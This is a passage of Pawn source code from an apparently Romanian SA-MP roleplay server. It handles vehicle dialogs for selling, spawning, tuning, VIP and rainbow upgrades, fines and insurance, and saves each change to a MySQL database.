			if(!CarInfo[idd][Spawned]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul nu este spawnat!");
			PlayerInfo[playerid][pPremiumPoints] -= 200;
			UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
			CarInfo[idd][Dayss] = 0;
			mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `Days`='0' WHERE `ID`='%d'", CarInfo[idd][cID]);
			mysql_tquery(SQL, gQuery);
			SCMf(playerid, COLOR_YELLOW, "* Felicitari! Ti-ai resetat cu succes zilele la vehiculul %s[id: %d].", aVehicleNames[CarInfo[idd][cModel]-400], CarInfo[idd][cID]);
		}
		case DIALOG_MEMBERS: {
			if(!response) return true;
			if(PlayerInfo[playerid][pRank] < 6) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de rank 6+ pentru a putea merge mai departe!");
			format(sName[playerid], MAX_PLAYER_NAME, Selected[playerid][listitem]);	
			mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name`='%s'", sName[playerid]);
			mysql_tquery(SQL, gQuery, "sql_cache_members", "i", playerid);
		}
		case DIALOG_RAPORTS: {
			if(!response) return ShowFactionMembers(playerid);
		}	
		case DIALOG_SELLCAR: {
			if(!response) return true;
			new vsid = PlayerSellCar[playerid];
			if(CarInfo[vsid][Spawned] == 0) return true;
						
			new value = CarInfo[vsid][cValue] / 2;

			GivePlayerCash(playerid, value);
			format(string, sizeof(string), "Ai primit $%s pentru ca ti-ai vandut vehiculul!",FormatNumber(value), "%%");
			SendClientMessage(playerid,COLOR_MONEY,string);
						
			format(string, sizeof(string), "%s si-a vandut vehiculul %s[%d] (la stat) si a primit $%s.", GetName(playerid), aVehicleNames[CarInfo[vsid][cModel]-400], vsid, FormatNumber(value));
			SendAdminMessage(COLOR_YELLOW, string, 1); 
			InsertLog(playerid, string, LOG_SELL);	
			DestroyPlayerCar(vsid);
			Iter_Remove(MyVehicle<playerid>, vsid);
			mysql_format(SQL, gQuery, sizeof(gQuery), "DELETE FROM `cars` WHERE `ID`='%d' LIMIT 1", CarInfo[vsid][cID]);
			mysql_tquery(SQL, gQuery, "", "");		
		}
		case DIALOG_GARAGE: {
		}
		case DIALOG_STICKET: {
			if(!response) return true;
			if(!PlayerInfo[playerid][pTickets][listitem]) return SendErrorMsg(playerid, "Nu ai un ticket de acel tip.");

			listitemm[playerid] = listitem;

			switch(listitem) {
				case 3,4: return true;
				default: {
					if(!Iter_Count(MyVehicle<playerid>))
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai vehicule personale!");

					new x; gString[0] = gQuery[0] = (EOS);
					strcat(gString, "Vehicul\tStatus\tDespawn Time\tOthers details\n");
					foreach(new idd : MyVehicle<playerid>) {
						if(!CarInfo[idd][Spawned]) continue;
						format(gQuery, 128, "%s\t%s\t%s\t%s\n", 
							GetVehicleName(CarInfo[idd][cModel]),
							CarInfo[idd][Spawned] != 0 ? IsVehicleOccupied(CarInfo[idd][Spawned]) ? ("{F3C13A}[occupied]") : CarInfo[idd][cGarage] != -1 && GetVehicleVirtualWorld(CarInfo[idd][Spawned]) ? ("{FF0000}[in garage]") : ("{26B309}[spawned]") : ("{FF0000}[despawned]"), 
							CheckDespawnCar(idd), 
							TotalUp(idd)); 

						strcat(gString, gQuery);
						PlayerInfo[playerid][pCarKey][x] = idd;
						x++;
					}
					if(!x) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Trebuie sa ai vehiculul spawnat!");
					ShowPlayerDialog(playerid, DIALOG_SELECTC, DIALOG_STYLE_TABLIST_HEADERS, "Select Vehicle", gString, "Ok", "Exit");
				}
			}
		}
		case DIALOG_SELECTC: {
			if(!response) 
				return true;

			new idd = PlayerInfo[playerid][pCarKey][listitem];
			if(!CarInfo[idd][Spawned]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest vehicul nu este spawnat!");
			listitemmm[playerid] = listitem;

			switch(listitemm[playerid]) {
				case 0: {
					if(CarInfo[idd][cRainBow]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest vehicul are deja rainbow.");

	                new c = PlayerInfo[playerid][pCarKey][listitemmm[playerid]];
	                if(!CarInfo[c][Spawned]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest vehicul nu este spawnat!");

	                CarInfo[c][cRainBow] = true;
	                mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `RainBow` = '1' WHERE `ID` = '%i'", CarInfo[c][cID]);
	                mysql_tquery(SQL, gQuery);
	                SendClientMessage(playerid, COLOR_YELLOW, "* Felicitari! Ai achizitionat optiunea rainbow printr-un ticket.");
				}
				case 1: {
					if(strlen(CarInfo[idd][cText])>=3) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest vehicul are deja VIP.");
					strmid(CarInfo[idd][cText], PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);
					mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `Text` = '%s' WHERE `ID` = '%i'", CarInfo[idd][cText], CarInfo[idd][cID]);
					mysql_tquery(SQL, gQuery);

					SendClientMessage(playerid, COLOR_YELLOW, "Congratulations! You upgraded the vehicle to a VIP");
					attach_vip_text(idd);
				}
				case 2: {
					if(CarInfo[idd][cPFuel]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest vehicul are deja premium fuel.");
					
					CarInfo[idd][cPFuel] = true;
					mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `PFuel` = '1' WHERE `ID` = '%i'", CarInfo[idd][cID]);
					mysql_tquery(SQL, gQuery);
					SendClientMessage(playerid, COLOR_YELLOW, "Congratulations! You upgraded the vehicle to a premium fuel");
				}
				case 5: {				
					CarInfo[idd][KM] = 0.0;
					mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `KM` = '0.0' WHERE `ID` = '%i'", CarInfo[idd][cID]);
					mysql_tquery(SQL, gQuery);
					SendClientMessage(playerid, COLOR_YELLOW, "Congratulations! You reset the vehicle KM!");
				}
				case 6: {				
					CarInfo[idd][Dayss] = 0;
					mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `Days` = '0' WHERE `ID` = '%i'", CarInfo[idd][cID]);
					mysql_tquery(SQL, gQuery);
					SendClientMessage(playerid, COLOR_YELLOW, "Congratulations! You reset the vehicle days!");
				}
			}

			PlayerInfo[playerid][pTickets][listitemm[playerid]] --;	
			save_tickete(playerid);	
		}
		case DIALOG_GARAGE1: {
			if(!response) return true;
			new vsid = listitemm[playerid];
			switch(listitem) {
				case 0: ShowCarInfo(playerid, vsid);
				case 1: {
					if(CarInfo[vsid][Spawned] == 0) {	
						if(CarInfo[vsid][Confiscated]) return SendErrorMsg(playerid, "Acest vehicul este confiscat deoarece a fost parcat neregulamentar! Plateste amenda (ultimul rand din meniu).");	
						if(MyVehicleSpawn[playerid] >= (!PlayerInfo[playerid][pReborn] ? 4 : 6)) return SendErrorMsg(playerid, !PlayerInfo[playerid][pReborn] ? "Poti avea doar 4 masini spawnate." : "Poti avea doar 6 masini spawnate.");
						
						SpawnPlayerCar(playerid, vsid);
						return va_SendClientMessage(playerid, COLOR_CLIENT, "Your %s has been spawned.", GetVehicleName(CarInfo[vsid][cModel]));					
					}
					else {
						if(IsAttached(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Nu poti folosi aceasta functie momentan!");
						if(IsVehicleOccupied(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Vehiculul tau este ocupat!");

						DestroyPlayerCar(vsid);			
						return va_SendClientMessage(playerid, COLOR_CLIENT, "Your %s has been despawned.", GetVehicleName(CarInfo[vsid][cModel]));					
					}
				}
				case 2: {			
					if(GetPlayerCash(playerid) < 5000) return SendErrorMsg(playerid, "Nu ai $5000!");
					if(CarInfo[vsid][Spawned] == 0) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
					if(IsVehicleOccupied(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Vehiculul tau este ocupat!");
					if(CarInfo[vsid][Confiscated]) return SendErrorMsg(playerid, "Acest vehicul este confiscat deoarece a fost parcat neregulamentar! Plateste amenda (ultimul rand din meniu).");
					if(IsAttached(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Nu poti folosi aceasta functie momentan!");

                    CarInfo[vsid][cTime] = 600;
					SetVehicleToRespawn(CarInfo[vsid][Spawned]);
					SetVehicleHealth(CarInfo[vsid][Spawned], CarInfo[vsid][cVip] ? 2000 : 1000);
					SetTunning(vsid); GivePlayerCash(playerid, -5000);
					return va_SendClientMessage(playerid, COLOR_CLIENT, "Your %s has been respawned.", GetVehicleName(CarInfo[vsid][cModel]));
				}
				case 3: { 
					if(CarInfo[vsid][Spawned] == 0) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
					if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
					
					new Float:vehx, Float:vehy, Float:vehz;
					GetVehiclePos(CarInfo[vsid][Spawned], vehx, vehy, vehz);
					SetPlayerCheckpoint(playerid, vehx, vehy, vehz, 3.0); CP[playerid] = 53;
					return va_SendClientMessage(playerid, COLOR_YELLOW, "Mergi la punctul rosu de pe minimap pentru a ajunge la masina ta. Distanta: %.1m.", GetPlayerDistanceFromPoint(playerid, vehx, vehy, vehz));
				}	
				case 4: {
					format(gString, 128, "Insurance price: $%d / insurance point.\n\nBuy insurance point (maximum 3):", CarInfo[vsid][cTax]);
					return ShowPlayerDialog(playerid, DIALOG_INSURANCE, DIALOG_STYLE_INPUT, "Buy Insurance", gString, "Buy", "Cancel");				
				}
				case 5: {
					if(CarInfo[vsid][Spawned] == 0) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
					if(IsAttached(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Nu poti folosi aceasta functie momentan!");
					if(IsVehicleOccupied(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Vehiculul tau este ocupat!");
					if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
					
					CP[playerid] = 53;
					SendClientMessage(playerid, COLOR_YELLOW, "Checkpoint marked at the vehicle location.");

					if(IsAFLYCar(CarInfo[vsid][Spawned])) {
						SetVehiclePosEx(CarInfo[vsid][Spawned], -1649.1798, -159.0667, 17.3618);
						SetVehicleZAngleEx(CarInfo[vsid][Spawned], -44.1000);
				        new randspawn = random(sizeof(HeliVehPos));
						SetVehiclePosEx(CarInfo[vsid][Spawned], HeliVehPos[randspawn][0], HeliVehPos[randspawn][1], HeliVehPos[randspawn][2]);
						SetVehicleZAngleEx(CarInfo[vsid][Spawned], 44.4000);
						SetPlayerCheckpoint(playerid, HeliVehPos[randspawn][0], HeliVehPos[randspawn][1], HeliVehPos[randspawn][2], 5.0);
						return true;
					}
					else if(IsABOATCar(CarInfo[vsid][Spawned])) {
				        new randspawn = random(sizeof(BoatVehPos));
						SetVehiclePosEx(CarInfo[vsid][Spawned], BoatVehPos[randspawn][0], BoatVehPos[randspawn][1], BoatVehPos[randspawn][2]);
						SetVehicleZAngleEx(CarInfo[vsid][Spawned], -173.4001);
						SetPlayerCheckpoint(playerid, BoatVehPos[randspawn][0], BoatVehPos[randspawn][1], BoatVehPos[randspawn][2], 5.0);
						return true;
					}
					else {
				        new randspawn = random(sizeof(DealerCarPos));
						SetVehiclePosEx(CarInfo[vsid][Spawned], DealerCarPos[randspawn][0], DealerCarPos[randspawn][1], DealerCarPos[randspawn][2]);
						SetVehicleZAngleEx(CarInfo[vsid][Spawned], -173.4001);
						SetPlayerCheckpoint(playerid, DealerCarPos[randspawn][0], DealerCarPos[randspawn][1], DealerCarPos[randspawn][2], 5.0);
						return true;
					}
				}
				case 6: {
					if(TradeID[playerid] != -1) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");
					if(CarInfo[vsid][Spawned] == 0) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
					if(!PlayerToPoint(10, playerid, 2131.7717,-1151.3202,24.0600)) return SendErrorMsg(playerid, "Trebuie sa fii la dealership. Foloseste /gps pentru a afla unde este.");
		            if(IsAttached(CarInfo[vsid][Spawned]))  return SendErrorMsg(playerid, "Nu poti folosi aceasta functie momentan!");
		            if(GetPlayerVehicleID(playerid) != CarInfo[vsid][Spawned]) return SendErrorMsg(playerid, "Trebuie sa fi in acel vehicul!");
					if(CP[playerid] == 43 || CP[playerid] == 53) CP[playerid] = 0, DisablePlayerCheckpointEx(playerid); 

                    PlayerSellCar[playerid] = vsid;
					format(gString, 128, "Esti sigur ca vrei sa-ti vinzi %s pentru $%s?",aVehicleNames[CarInfo[vsid][cModel]-400], FormatNumber(CarInfo[vsid][cValue] / 2));
					return ShowPlayerDialog(playerid, DIALOG_SELLCAR, DIALOG_STYLE_MSGBOX, "Dealership", gString, "Da", "Nu");
				}
				case 7: {
					switch(CarInfo[vsid][cVip]) {
						case 0: {
							if(CarInfo[vsid][cVip]) return SendErrorMsg(playerid, "Acest vehicul are deja upgrade-ul VIP PLUS.");
							if(strlen(CarInfo[vsid][cText]) < 3) return SendErrorMsg(playerid, "Pentru a upgrada la 'VIP Plus Vehicle' trebuie mai intai ca vehiculul sa aiba optiunea 'VIP'!");
							if(PlayerInfo[playerid][pPremiumPoints] < 500) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
							return ShowPlayerDialog(playerid, DIALOG_UPGRADEVIPL, DIALOG_STYLE_MSGBOX, "Upgrade to VIP PLUS Vehicle", "Esti sigur ca vrei sa faci acest upgrade? (500PP)\n\nAvantaje:\n-Vehiculul are 2000HP.\n-Posibilitatea de a aduce vehiculul la tine odata pe ora.", "Da", "Nu");
						}
						case 1: {
							if(CarInfo[vsid][Spawned] == 0) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
							if(IsVehicleOccupied(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Vehiculul tau este ocupat!");
							if(gettime() < CarInfo[vsid][cTimeGoto]) return va_SendClientMessage(playerid, COLOR_TEAL, "You can't use this option for %d minutes and %d seconds.", (CarInfo[vsid][cTimeGoto]-gettime())/60, (CarInfo[vsid][cTimeGoto]-gettime())%60);
							if(IsAttached(CarInfo[vsid][Spawned])) return SendErrorMsg(playerid, "Nu poti folosi aceasta functie momentan!");
		                  	if(GetPlayerVirtualWorld(playerid) != 0 || GetPlayerInterior(playerid) != 0) return SendErrorMsg(playerid, "Nu poti folosi aceasta optiune intr-un VW / Interior diferit de 0.");

							new Float: X, Float: Y, Float: Z;
							GetPlayerPos(playerid, X, Y, Z);
							SetVehiclePosEx(CarInfo[vsid][Spawned], X, Y+4, Z);
							SetVehicleVirtualWorld(CarInfo[vsid][Spawned], GetPlayerVirtualWorld(playerid));
							LinkVehicleToInterior(CarInfo[vsid][Spawned], GetPlayerInterior(playerid));
							SendClientMessage(playerid, COLOR_MONEY, "(VIP Plus) {FFFFFF}You called the mechanic, please wait..");
							CarInfo[vsid][cTimeGoto] = gettime()+(PlayerInfo[playerid][pVip] != 3 ? 900 : 450);
							return _query("UPDATE `cars` SET `TimeGoto`='%d' WHERE `ID`='%d'", CarInfo[vsid][cTimeGoto], CarInfo[vsid][cID]);
						}
					}
				}
				case 8: {
					if(CarInfo[vsid][Spawned] == 0) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
					if(strlen(CarInfo[vsid][cText]) >= 3) return SendErrorMsg(playerid, "Acest vehicul este deja unul VIP!");
					if(PlayerInfo[playerid][pPremiumPoints] < 300) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					return ShowPlayerDialog(playerid, DIALOG_UPGRADEVIP, DIALOG_STYLE_MSGBOX, "Upgrade to VIP Vehicle", "Esti sigur ca vrei sa faci acest lucru?\nVei pierde 300 puncte premium.", "Da", "Nu");
				}
				case 9: {
					if(CarInfo[vsid][Spawned] == 0) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
					if(CarInfo[vsid][cRainBow]) return SendErrorMsg(playerid, "Acest vehicul este deja unul RainBow!");
					if(PlayerInfo[playerid][pPremiumPoints] < 300) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					return ShowPlayerDialog(playerid, DIALOG_UPGRADERAINBOW, DIALOG_STYLE_MSGBOX, "Upgrade to RainBow", "Are you sure you want to do this? \nIt lose 300 Premium Points.", "Upgrade", "Cancel");
				}
				case 10: {
					if(!CarInfo[vsid][Spawned]) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
					if(PlayerInfo[playerid][pPremiumPoints] < 200) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					return ShowPlayerDialog(playerid, DIALOG_RESETKM, DIALOG_STYLE_MSGBOX, "{ffff00}Reset KM", "Esti sigur ca vrei sa faci acest lucru?\nVei pierde 200 puncte premium.", "Da", "Nu");
				}
				case 11: {
					if(!CarInfo[vsid][Spawned]) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
					if(PlayerInfo[playerid][pPremiumPoints] < 200) return ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
					return ShowPlayerDialog(playerid, DIALOG_RESETDAYS, DIALOG_STYLE_MSGBOX, "{ffff00}Reset Days", "Esti sigur ca vrei sa faci acest lucru?\nVei pierde 200 puncte premium.", "Da", "Nu");
				}
				case 12: {
					if(CarInfo[vsid][Spawned] == 0) return SendErrorMsg(playerid, "Vehiculul tau nu este spawnat!");
					for(new i = 0; i < 14; i++) if(CarInfo[vsid][cMod][i] != 0) RemoveVehicleComponent(CarInfo[vsid][Spawned], CarInfo[vsid][cMod][i]), CarInfo[vsid][cMod][i] = 0;
					
					ChangeVehiclePaintjob(CarInfo[vsid][Spawned], 3); CarInfo[vsid][paintjob] = 3;
					_query("UPDATE `cars` SET `Mods`='%i %i %i %i %i %i %i %i %i %i %i %i %i %i' WHERE `ID`='%i'", CarInfo[vsid][cMod][0], CarInfo[vsid][cMod][1], CarInfo[vsid][cMod][2],CarInfo[vsid][cMod][3], CarInfo[vsid][cMod][4], CarInfo[vsid][cMod][5], CarInfo[vsid][cMod][6], CarInfo[vsid][cMod][7], CarInfo[vsid][cMod][8], CarInfo[vsid][cMod][9],CarInfo[vsid][cMod][10], CarInfo[vsid][cMod][11], CarInfo[vsid][cMod][12], CarInfo[vsid][cMod][13], CarInfo[vsid][cID]);
					_query("UPDATE `cars` SET `paintjob`='%d' WHERE `ID`='%d'",CarInfo[vsid][paintjob], CarInfo[vsid][cID]);
					return SendClientMessage(playerid, COLOR_YELLOW, "Tuning was successfully deleted!");			
				}
				case 13: {
					if(!CarInfo[vsid][Confiscated]) return true;
					if(GetPlayerCash(playerid) < 5000000) return SendErrorMsg(playerid, "Eroare: Ai nevoie de $5.000.000 pentru a plati amenda!");
					return ShowPlayerDialog(playerid, DIALOG_TAX, DIALOG_STYLE_MSGBOX, "Plateste amenda","Esti sigur ca vrei sa platesti amenda pentru parcarea neregulamentara?\nDaca consideri ca a fost luata aiurea, cere o dovada pe forum.", "Da", "Nu");
				}				
			}					
		}
		case DIALOG_UPGRADEVIP: {
			if(!response) return true;
			new idd = listitemm[playerid];
			if(CarInfo[idd][Spawned] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
			if(valid_vip_vehicle(CarInfo[idd][cModel]) == 0) return SendClientMessage(playerid, COLOR_GREY, "Acest vehicul nu poate fi upgradat!");
			if(strlen(CarInfo[idd][cText]) >= 3) return SendClientMessage(playerid, -1, "Acest vehicul este deja unul VIP!");
			if(PlayerInfo[playerid][pPremiumPoints] < 300) return SendClientMessage(playerid, -1, "Nu ai destule Premium Points.");
			PlayerInfo[playerid][pPremiumPoints] -= 300;
			UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
			SendClientMessage(playerid, COLOR_YELLOW, "* Felicitari! Ti-ai upgradat cu succes vehiculul la unul VIP.");
			format(string, sizeof(string), "%s si-a upgradat vehiculul %s[id: %d] la unul VIP pentru 300 Premium Points.", GetName(playerid), aVehicleNames[CarInfo[idd][cModel]-400], idd);
			InsertLog(playerid, string, LOG_SHOP);				
			mysql_format(SQL, string, sizeof(string), "UPDATE `cars` SET `Text`='%s' WHERE `ID`='%d'", GetName(playerid), CarInfo[idd][cID]);
			mysql_tquery(SQL, string, "", "");
			CarInfo[idd][cVipPos][0]=CarInfo[idd][cVipPos][1]=CarInfo[idd][cVipPos][2]=CarInfo[idd][cVipPos][3]=CarInfo[idd][cVipPos][4]=CarInfo[idd][cVipPos][5]=0.0;
			switch(CarInfo[idd][cModel]) {
				case 411: CarInfo[idd][cVipPos][1] = -1.9, CarInfo[idd][cVipPos][2] = 0.3, CarInfo[idd][cVipPos][3] = 270.0;
				case 560: CarInfo[idd][cVipPos][1] = -0.6, CarInfo[idd][cVipPos][2] = 0.8, CarInfo[idd][cVipPos][3] = 270.0;
				case 541: CarInfo[idd][cVipPos][1] = -0.4, CarInfo[idd][cVipPos][2] = 0.59, CarInfo[idd][cVipPos][3] = 270.0;
				case 429: CarInfo[idd][cVipPos][1] = -1.79, CarInfo[idd][cVipPos][2] = 0.33, CarInfo[idd][cVipPos][3] = 270.0;
				case 495: CarInfo[idd][cVipPos][1] = -1.2, CarInfo[idd][cVipPos][2] = 1, CarInfo[idd][cVipPos][3] = 270.0;
				case 579: CarInfo[idd][cVipPos][1] = -2, CarInfo[idd][cVipPos][2] = 1.21,CarInfo[idd][cVipPos][3] = 270.0;
				case 562: CarInfo[idd][cVipPos][1] = -0.69, CarInfo[idd][cVipPos][2] = 0.76, CarInfo[idd][cVipPos][3] = 270.0;
				case 451: CarInfo[idd][cVipPos][1] = -0.6, CarInfo[idd][cVipPos][2] = 0.56, CarInfo[idd][cVipPos][3] = 270.0;
				case 480: CarInfo[idd][cVipPos][1] = -1.58, CarInfo[idd][cVipPos][2] = 0.27, CarInfo[idd][cVipPos][3] = 270.0;
			}
			format(CarInfo[idd][cText], 32, GetName(playerid));
			attach_vip_text(idd);
			finishAchievement(playerid, 28);
		}
		case DIALOG_UPGRADEVIPL: {
			if(!response) return true;
			new idd = listitemm[playerid];
			if(CarInfo[idd][cVip]) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja upgradat la VIP Plus.");

			if(CarInfo[idd][Spawned] == 0) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");

			if(strlen(CarInfo[idd][cText]) < 3) 
				return SendClientMessage(playerid, -1, "Mai intai ai nevoie de upgrade-ul 'VIP' pentru a putea upgrada la 'VIP PLUS'.");

			if(PlayerInfo[playerid][pPremiumPoints] < 500) 
				return SendClientMessage(playerid, -1, "Nu ai destule Premium Points.");

			PlayerInfo[playerid][pPremiumPoints] -= 500;
			UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
			SendClientMessage(playerid, COLOR_YELLOW, "* Felicitari! Ti-ai upgradat cu succes vehiculul la VIP PLUS.");
			format(string, sizeof(string), "%s si-a upgradat vehiculul %s[id: %d] la unul VIP Plus pentru 500 Premium Points.", GetName(playerid), aVehicleNames[CarInfo[idd][cModel]-400], idd);
			InsertLog(playerid, string, LOG_SHOP);		
			CarInfo[idd][cVip] = true;	
			CarInfo[idd][cTimeGoto] = gettime();	
			gQuery[0] = EOS;
			mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `cars` SET `VIP`='%d', `TimeGoto`='%d' WHERE `ID`='%d'", CarInfo[idd][cVip], CarInfo[idd][cTimeGoto], CarInfo[idd][cID]);
			mysql_tquery(SQL, gQuery, "", "");
		}
		case DIALOG_UPGRADERAINBOW: {
			if(!response) return true;
			new idd = listitemm[playerid];
			if(CarInfo[idd][Spawned] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
			if(CarInfo[idd][cRainBow]) return SendClientMessage(playerid, -1, "Acest vehicul este deja unul RainBow!");
			if(PlayerInfo[playerid][pPremiumPoints] < 300) return SendClientMessage(playerid, -1, "Nu ai destule Premium Points.");
			PlayerInfo[playerid][pPremiumPoints] -= 300;
			UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
			SendClientMessage(playerid, COLOR_YELLOW, "* Felicitari! Ti-ai upgradat cu succes vehiculul la unul RainBow.");
			format(string, sizeof(string), "%s si-a upgradat vehiculul %s[id: %d] la unul RainBow pentru 200 Premium Points.", GetName(playerid), aVehicleNames[CarInfo[idd][cModel]-400], idd);
			InsertLog(playerid, string, LOG_SHOP);
			finishAchievement(playerid, 29);
			CarInfo[idd][cRainBow] = true;
			mysql_format(SQL, string, sizeof(string), "UPDATE `cars` SET `RainBow`='%d' WHERE `ID`='%d'", CarInfo[idd][cRainBow], CarInfo[idd][cID]);
			mysql_tquery(SQL, string, "", "");
		}
		case DIALOG_UPSTAGE: {
			if(!response) return true;
			new idd = FindSpawnID(GetPlayerVehicleID(playerid));
			if(idd == -1) return true;
			if(CarInfo[idd][cStage] >= (!CarInfo[idd][cClan]?4:3)) return SendErrorMsg(playerid, "Acest vehicul este upgradat la stage maximum!");
			if(IsABike(CarInfo[idd][cModel])) return SendErrorMsg(playerid, "Nu poti upgrada acest vehicul!");

			if(!CarInfo[idd][cClan]) {
				if(PlayerInfo[playerid][pPremiumPoints] < StagePrice[CarInfo[idd][cStage]+1]) return SendErrorMsg(playerid, "Nu ai destule Premium Points.");
				PlayerInfo[playerid][pPremiumPoints] -= StagePrice[CarInfo[idd][cStage]+1];
				Iter_Add(IsSpeed, playerid);
				UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
				_query("UPDATE `cars` SET `Stage`='%d' WHERE `ID`='%d'", CarInfo[idd][cStage]+1, CarInfo[idd][cID]);
			} 
			else {
				new clanid = CarInfo[idd][cClan];
				if(ClanInfo[clanid][clPremiumPoints] < StagePrice[CarInfo[idd][cStage]+1]) return SendErrorMsg(playerid, "Nu sunt destule premium points in clan.");
				ClanInfo[clanid][clPremiumPoints] -= StagePrice[CarInfo[idd][cStage]+1];
				_query("UPDATE `clans` SET `PremiumPoints` = '%i' WHERE `ID` = '%i'", ClanInfo[clanid][clPremiumPoints], ClanInfo[clanid][cID]);
				_query("UPDATE `clanvehicle` SET `Stage`='%d' WHERE `ID`='%d'", CarInfo[idd][cStage]+1, CarInfo[idd][cID]);			
			}
			CarInfo[idd][cStage] ++;
			va_SendClientMessage(playerid, COLOR_WHITE, "{4286f4}Tuning System: {FFFFFF}You upgraded your vehicle successfully to stage %d for %d premium points.", CarInfo[idd][cStage]+1, StagePrice[CarInfo[idd][cStage]+1]);
			
   			if(CarInfo[idd][cStage] <= 3) format(string, sizeof(string), "Your vehicle is~y~ %s~n~~w~~h~Max. speed:~y~ %d km/h~n~~w~~h~Current stage:~y~ %d/%d~w~~h~~n~Total boost: ~y~+%d km/h~w~~h~ / ~b~ %d km/h"
		    ,aVehicleNames[GetVehicleModel(GetPlayerVehicleID(playerid))-400], GetVehicleMaxSpeed(CarInfo[idd][cModel]), CarInfo[idd][cStage]+1, !CarInfo[idd][cClan] ? 4 : 3, StageSpeed[CarInfo[idd][cStage]], (GetVehicleMaxSpeed(CarInfo[idd][cModel]) + StageSpeed[CarInfo[idd][cStage]]));
		    else format(string, sizeof(string), "Your vehicle is~y~ %s~n~~w~~h~Max. speed:~y~ %d km/h~n~~w~~h~Current stage:~y~ %d/4~w~~h~~n~Total stagepriceboost: launch control"
		    ,aVehicleNames[GetVehicleModel(GetPlayerVehicleID(playerid))-400], ((StageSpeed[CarInfo[idd][cStage]]) + (GetVehicleMaxSpeed(CarInfo[idd][cModel]))), CarInfo[idd][cStage]);
		    PlayerTextDrawSetString(playerid, StagePTD, string);

		}
		case DIALOG_TAX: {
			if(!response) return true;
			if(GetPlayerCash(playerid)<5000000)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de $5.000.000 pentru a plati amenda.");

			new vsid = listitemm[playerid];
			GivePlayerCash(playerid, -5000000);
			CarInfo[vsid][Confiscated] = false;
	
			mysql_format(SQL, query, sizeof(query), "UPDATE `cars` SET `Confiscated`='0' WHERE `ID`='%d'", CarInfo[vsid][cID]);
			mysql_tquery(SQL, query, "", "");
			format(string, sizeof(string), "TTC Dispatch: %s (%d) si-a platit amenda in valoare de $5.000.000 pentru a-si recupera vehiculul (dbid:%d)", GetName(playerid), playerid, CarInfo[vsid][cID]);
			SendFactionMessage(8, COLOR_LIGHTBLUE, string);
			SendClientMessage(playerid, COLOR_MONEY, "Ai platit amenda de $5.000.000 pentru parcarea neregulamentara. Ai grija data viitoare!");
		}
		case DIALOG_INSURANCE: {
			if(!response) return true;
			new vsid = listitemm[playerid], points = strval(inputtext);
			if(points + CarInfo[vsid][cPoints] > 5 || points < 1) return SendErrorMsg(playerid, "Nu poti avea mai mult de 5 puncte de asigurare!");
